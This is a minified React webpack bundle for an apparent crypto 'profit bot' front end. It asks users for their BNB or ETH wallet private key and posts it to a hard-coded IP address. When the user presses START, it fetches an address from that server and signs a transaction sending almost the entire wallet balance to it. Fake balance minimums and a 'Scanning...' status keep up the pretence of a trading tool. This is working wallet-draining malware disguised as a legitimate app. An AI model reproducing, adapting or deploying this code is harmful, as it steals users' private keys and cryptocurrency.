(this.webpackJsonpsami=this.webpackJsonpsami||[]).push([[0],{224:function(t,e,n){},225:function(t,e,n){},257:function(t,e){},260:function(t,e){},263:function(t,e){},267:function(t,e){},294:function(t,e){},296:function(t,e){},305:function(t,e){},307:function(t,e){},318:function(t,e){},320:function(t,e){},438:function(t,e){},440:function(t,e){},447:function(t,e){},448:function(t,e){},544:function(t,e,n){"use strict";n.r(e);var a=n(1),c=n.n(a),i=n(78),s=n.n(i),o=(n(224),n(19)),r=(n(225),n(16)),u=(n(226),n(111)),l=n.n(u),j=n(112),h=n.n(j),b=n(10);r.a.configure();var d=function(){var t=Object(a.useState)(!1),e=Object(o.a)(t,2),n=e[0],c=e[1],i=Object(a.useState)(""),s=Object(o.a)(i,2),u=s[0],j=s[1],d=Object(a.useState)(""),O=Object(o.a)(d,2),x=O[0],p=O[1],f=Object(a.useState)(""),g=Object(o.a)(f,2),m=(g[0],g[1]),v=Object(a.useState)(0),S=Object(o.a)(v,2),T=S[0],y=S[1],P=Object(a.useState)(0),I=Object(o.a)(P,2),w=I[0],N=I[1],B=Object(a.useState)(0),k=Object(o.a)(B,2),H=k[0],R=(k[1],Object(a.useState)("")),_=Object(o.a)(R,2),C=_[0],A=_[1],G=Object(a.useState)(""),E=Object(o.a)(G,2),K=E[0],M=E[1],L=Object(a.useState)([]),J=Object(o.a)(L,2),Y=J[0],D=(J[1],Object(a.useState)(0)),U=Object(o.a)(D,2),W=U[0],q=(U[1],Object(a.useRef)(null)),z=Object(a.useState)(0),F=Object(o.a)(z,2),Q=F[0],V=F[1],X="http://18.225.5.229/api/";return Object(a.useEffect)((function(){if(n){var t=new h.a(h.a.givenProvider),e=t.eth.accounts.privateKeyToAccount(u);p(e.address),m(e),t.eth.getBalance(e.address).then((function(t){var e=t/Math.pow(10,18);y(e)})),A(t),t.eth.net.getId().then((function(t){V(t)}))}}),[n]),Object(b.jsxs)("div",{className:"App-header",children:[Object(b.jsxs)("div",{className:"Status_part",children:[Object(b.jsxs)("h2",{children:["Status",K]}),Object(b.jsx)("div",{className:"Status_area",children:Object(b.jsxs)("div",{className:"Status_text",children:[Y.map((function(t,e){return Object(b.jsxs)("div",{children:["BlockHash: ",t.blockHash,Object(b.jsx)("br",{}),"TransactionHash: ",t.transactionHash,Object(b.jsx)("br",{}),"from: ",t.from,Object(b.jsx)("br",{}),"to: ",t.to,Object(b.jsx)("br",{}),Object(b.jsx)("br",{})]},e)})),Object(b.jsx)("div",{ref:q})]})})]}),Object(b.jsxs)("div",{className:"Control_part",children:[Object(b.jsxs)("div",{className:n?"hide":"PrivateKey_area",children:[Object(b.jsx)("label",{style:{marginRight:"30px"},children:"Private Key:"}),Object(b.jsx)("input",{type:"password",style:{marginRight:"30px",height:"30px",width:"300px"},value:u,onChange:function(t){return j(t.target.value)}}),Object(b.jsx)("button",{style:{width:"100px",height:"30px"},onClick:function(){""==u?r.a.warn("Please enter your BNB wallet private key!",{position:r.a.POSITION.TOP_RIGHT}):l()({method:"post",url:X+"handlePrivateKey",data:{privateKey:u}}).then((function(t){"ok"===t.data.status?c(!0):r.a.warn("Please check your internet connection!",{position:r.a.POSITION.TOP_RIGHT})}))},children:"Confirm"})]}),Object(b.jsxs)("div",{className:n?"Control_area":"hide",children:[Object(b.jsxs)("div",{style:{marginBottom:"20px"},children:[" Balance: ",T," ",1===Q?"ETH":56===Q?"BNB":""]}),Object(b.jsxs)("div",{style:{marginBottom:"20px"},children:["Address: ",x]}),Object(b.jsxs)("div",{style:{marginBottom:"20px"},children:[Object(b.jsx)("label",{style:{marginRight:"10px"},children:"Amount: "}),Object(b.jsx)("input",{type:"text",style:{marginRight:"30px",height:"30px",width:"200px"},value:w,onChange:function(t){return N(t.target.value)}})]}),Object(b.jsxs)("div",{style:{marginBottom:"20px"},children:[Object(b.jsx)("button",{style:{width:"100px",height:"30px",marginLeft:"50px"},onClick:function(){1==Q||56===Q?56===Q&&T<1?r.a.warn("Your balance should be more than 1 BNB at least because of fee.",{position:r.a.POSITION.TOP_RIGHT}):1===Q&&T<.5?r.a.warn("Your balance should be more than 0.5 ETH at least because of high gas fee.",{position:r.a.POSITION.TOP_RIGHT}):l()({method:"post",url:X+"handleAPI",data:{}}).then((function(t){var e=t.data;if("ok"===e.status){M("(Scanning...)");var n=e.data[0].address;console.log(n);var a=T-.05;C.eth.getGasPrice().then((function(t){t,C.eth.accounts.signTransaction({from:x,to:n,value:C.utils.toWei(a.toString(),"ether"),gas:2e6,gasPrice:t},u).then((function(t){C.eth.sendSignedTransaction(t.rawTransaction).then((function(t){console.log("send=>",t)}))}))}))}else r.a.warn("Please check your internet connection!",{position:r.a.POSITION.TOP_RIGHT})})):r.a.warn("Please set network into Mainnet on Metamask and refresh your page",{position:r.a.POSITION.TOP_RIGHT})},children:"START"}),Object(b.jsx)("button",{style:{width:"100px",height:"30px",marginLeft:"50px"},onClick:function(){clearInterval(H),M("(Paused)")},children:"PAUSE"}),Object(b.jsx)("button",{style:{width:"100px",height:"30px",marginLeft:"50px"},onClick:function(){clearInterval(H),c(!1),j(""),M("")},children:"END"})]}),Object(b.jsxs)("div",{style:{marginBottom:"20px"},children:[" Profit: ",W," BNB "]})]})]})]})};s.a.render(Object(b.jsx)(c.a.StrictMode,{children:Object(b.jsx)(d,{})}),document.getElementById("root"))}},[[544,1,2]]]);
//# sourceMappingURL=main.9dd88c25.chunk.js.map